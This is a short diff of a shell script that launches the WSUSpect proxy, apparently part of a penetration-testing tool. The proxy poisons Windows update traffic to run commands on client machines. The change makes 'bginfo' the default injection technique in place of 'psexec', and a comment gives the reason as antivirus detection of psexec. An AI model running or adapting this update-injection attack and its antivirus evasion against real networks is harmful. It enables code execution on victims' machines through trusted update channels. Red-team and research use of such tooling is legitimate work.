@@ -96,4 +96,9 @@ set_iptables A 2> /dev/null 1>&2
 
 echo "[*] Running WSUSpect proxy..."
 cd $SCRIPT_DIR/wsuspect-proxy
-python wsuspect_proxy.py psexec 9090
+
+# Default attack technique is bginfo due psexec being catched by some antivirus softwares.
+# You can easily switch to psexec uncommenting the following line and commenting the bginfo one.
+# python wsuspect_proxy.py psexec 9090
+
+python wsuspect_proxy.py bginfo 9090
